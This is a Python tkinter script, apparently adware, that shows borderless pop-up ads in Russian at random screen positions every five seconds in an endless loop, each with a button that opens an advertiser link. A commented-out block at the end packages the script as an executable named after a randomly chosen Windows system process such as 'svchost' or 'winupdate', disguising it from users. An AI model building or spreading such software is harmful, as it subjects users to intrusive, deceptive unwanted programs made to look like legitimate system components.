import random
import tkinter as tk
from PIL import Image, ImageTk
import webbrowser
from ads_data import ads
import time
import os

def show_ad():
    ad = random.choice(ads)
    window = tk.Tk()
    window.title("Реклама")
    window.overrideredirect(1)

    img = Image.open(ad["image"])
    img = img.resize((400, 400))
    img_tk = ImageTk.PhotoImage(img)

    background_label = tk.Label(window, image=img_tk)
    background_label.image = img_tk
    background_label.pack(fill=tk.BOTH, expand=True)

    button = tk.Button(window, text="ПЕРЕЙТИ", bg=ad["button_color"], command=lambda: webbrowser.open(ad["link"]), font=('Helvetica', 14))
    button.place(x=110, y=310, width=180, height=50)

    screen_width = window.winfo_screenwidth()
    screen_height = window.winfo_screenheight()
    x = random.randint(0, screen_width - 400)
    y = random.randint(0, screen_height - 400)
    window.geometry(f'400x400+{x}+{y}')

    close_icon = Image.open("ads/close_icon.png")
    close_icon = close_icon.resize((30, 30))
    close_icon_tk = ImageTk.PhotoImage(close_icon)

    close_button = tk.Label(window, image=close_icon_tk, bg='white', cursor="hand2")
    close_button.image = close_icon_tk
    close_button.place(x=365, y=0)

    def close_window(event):
        window.destroy()

    close_button.bind("<Button-1>", close_window)

    window.mainloop()

def main():
    while True:
        show_ad()
        time.sleep(5)

if __name__ == "__main__":
    # filenames = ["SystemUtility", "svchost", "taskmanager", "winupdate", "driverservice"]
    # chosen_filename = random.choice(filenames)
    # os.system(f"pyinstaller --onefile --name={chosen_filename} main.py")
    main()
